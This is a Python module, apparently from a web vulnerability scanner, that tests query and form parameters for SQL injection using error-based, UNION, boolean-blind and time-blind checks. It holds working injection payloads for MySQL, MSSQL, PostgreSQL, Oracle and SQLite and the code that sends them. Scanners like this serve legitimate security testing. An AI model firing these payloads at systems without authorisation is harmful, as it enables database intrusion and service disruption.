from __future__ import annotations

import asyncio
import time
from pathlib import Path

from icescan.checks.base import BaseCheck
from icescan.core.types import Finding, ScanContext, Surface, SurfaceKind, Severity
from icescan.core.surfaces import inject_into_url, inject_into_form

DATA = Path(__file__).resolve().parent.parent.parent / "data" / "payloads"

ERROR_PAYLOADS = [
    "'",
    "\"",
    "'\"",
    "')",
    "';",
    "'-- ",
    "' OR '1'='1",
    "' OR 1=1-- ",
    "\" OR \"1\"=\"1",
    "' AND 1=CONVERT(int,@@version)-- ",
    "' AND extractvalue(1,concat(0x7e,version))-- ",
    "' AND 1/0-- ",
]

UNION_PROBES = [
    "' ORDER BY {n}-- ",
    "' UNION SELECT {nulls}-- ",
]

TIME_PAYLOADS = {
    "mysql": ["' AND SLEEP({d})-- ", "' OR SLEEP({d})-- ", "' AND BENCHMARK(5000000,MD5('a'))-- "],
    "mssql": ["'; WAITFOR DELAY '0:0:{d}'-- ", "' AND 1=1; WAITFOR DELAY '0:0:{d}'-- "],
    "postgres": ["' AND 1=(SELECT 1 FROM PG_SLEEP({d}))-- ", "'; SELECT PG_SLEEP({d})-- "],
    "oracle": ["' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',{d})-- "],
    "sqlite": ["' AND 1=randomblob(100000000)-- "],
}

BOOLEAN_TRUE = ["' AND 1=1-- ", "' OR 'a'='a"]
BOOLEAN_FALSE = ["' AND 1=2-- ", "' OR 'a'='b"]


class SQLInjection(BaseCheck):
    name = "sqli"
    category = "injection"
    level = 1

    async def run_surface(self, ctx: ScanContext, surface: Surface) -> list[Finding]:
        findings: list[Finding] = []

        baseline = await ctx.baseline.get(surface)

        error_hit = await self._error_based(ctx, surface, baseline)
        if error_hit:
            findings.append(error_hit)
            if error_hit.dbms:
                ctx.dbms_hint = error_hit.dbms

        if self.level >= 2:
            union_hit = await self._union_based(ctx, surface, baseline)
            if union_hit:
                findings.append(union_hit)

            boolean_hit = await self._boolean_blind(ctx, surface, baseline)
            if boolean_hit:
                findings.append(boolean_hit)

            time_hit = await self._time_blind(ctx, surface, baseline)
            if time_hit:
                findings.append(time_hit)

        return findings

    async def _send(self, ctx, surface, payload):
        if surface.kind == SurfaceKind.QUERY:
            url = inject_into_url(surface.url, surface.name, payload)
            return await ctx.client.get(url)
        if surface.kind == SurfaceKind.BODY_FORM:
            fields = surface.extra.get("all_fields", [surface.name])
            data = inject_into_form(fields, surface.name, payload)
            return await ctx.client.request(surface.method, surface.url, data=data)
        return None

    async def _error_based(self, ctx, surface, baseline):
        for payload in ERROR_PAYLOADS:
            r = await self._send(ctx, surface, payload)
            if r is None or r.error:
                continue
            if baseline.body_hash and r.length and abs(r.length - baseline.length) / max(baseline.length, 1) < 0.001:
                continue
            hits = ctx.detector.match_errors(r.body)
            if hits:
                dbms, matched = hits[0]
                return self.finding(
                    severity=Severity.CRITICAL,
                    url=r.url, method=surface.method, param=surface.name,
                    payload=payload,
                    evidence={
                        "matched": matched,
                        "response_snippet": self._snippet(r.body, matched),
                        "status": r.status,
                    },
                    confidence="high", dbms=dbms,
                )
        return None

    async def _union_based(self, ctx, surface, baseline):
        max_cols = 15
        for n in range(1, max_cols + 1):
            payload = f"' ORDER BY {n}-- "
            r = await self._send(ctx, surface, payload)
            if r is None or r.error:
                continue
            if baseline.status and r.status >= 500:
                nulls = ",".join(["NULL"] * max(1, n - 1))
                probe = f"' UNION SELECT {nulls}-- "
                r2 = await self._send(ctx, surface, probe)
                if r2 and not r2.error and r2.status < 400 and abs(r2.length - baseline.length) / max(baseline.length, 1) < 0.05:
                    return self.finding(
                        severity=Severity.HIGH,
                        url=r2.url, method=surface.method, param=surface.name,
                        payload=probe,
                        evidence={"columns": n - 1, "status": r2.status},
                        confidence="medium",
                    )
        return None

    async def _boolean_blind(self, ctx, surface, baseline):
        t = await self._send(ctx, surface, BOOLEAN_TRUE[0])
        f = await self._send(ctx, surface, BOOLEAN_FALSE[0])
        if not t or not f or t.error or f.error:
            return None
        sim = ctx.detector.similarity(t.body, f.body)
        sim_t = ctx.detector.similarity(t.body, baseline.similarity_body)
        sim_f = ctx.detector.similarity(f.body, baseline.similarity_body)
        if sim < 0.9 and sim_t > sim_f + 0.05:
            return self.finding(
                severity=Severity.HIGH,
                url=surface.url, method=surface.method, param=surface.name,
                payload=f"{BOOLEAN_TRUE[0]} / {BOOLEAN_FALSE[0]}",
                evidence={"true_similarity": round(sim_t, 3), "false_similarity": round(sim_f, 3)},
                confidence="medium",
            )
        return None

    async def _time_blind(self, ctx, surface, baseline):
        delay = 3
        dbms = ctx.dbms_hint or "mysql"
        candidates = TIME_PAYLOADS.get(dbms, TIME_PAYLOADS["mysql"])
        for template in candidates:
            payload = template.format(d=delay)
            times = []
            for _ in range(3):
                t0 = time.monotonic()
                r = await self._send(ctx, surface, payload)
                if r is None or r.error:
                    times = []
                    break
                times.append(time.monotonic() - t0)
            if not times:
                continue
            base = 0.5
            avg = sum(times) / len(times)
            if avg > base + delay * 0.7:
                return self.finding(
                    severity=Severity.HIGH,
                    url=surface.url, method=surface.method, param=surface.name,
                    payload=payload,
                    evidence={"times": [round(x, 2) for x in times], "avg": round(avg, 2), "delay": delay},
                    confidence="high", dbms=dbms,
                )
        return None

    def _snippet(self, body: str, needle: str, width: int = 120) -> str:
        idx = body.lower().find(needle.lower())
        if idx == -1:
            return body[:width]
        s = max(0, idx - 40)
        e = min(len(body), idx + width)
        return body[s:e]
